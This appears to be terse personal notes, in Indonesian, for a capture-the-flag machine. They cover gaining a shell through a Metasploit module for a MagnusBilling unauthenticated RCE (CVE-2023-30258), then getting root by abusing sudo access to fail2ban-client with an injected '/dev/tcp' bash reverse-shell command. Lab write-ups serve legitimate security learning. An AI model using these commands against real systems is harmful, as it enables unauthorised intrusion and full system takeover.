# boot :
1. scan nmap 22 80 ada -> fuzz 2 2 nya -> cek framework nya
2. ada nih: https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/magnusbilling_unauth_rce_cve_2023_30258.rb
3. wget aja taruh di /usr/share metasploit exploit linux http dah -> msfconsole search magnus
4. use aja taruh ip ipmu dah 
5. dapet shell revshell aja -> klaim user flag

# PE :
1. sudo -l ada tapi gatau -> cari wu aja
2. sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'"
3. kalau udah -> sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1 
4. sambil nyalain nc sebelumnya
5. klaim root 
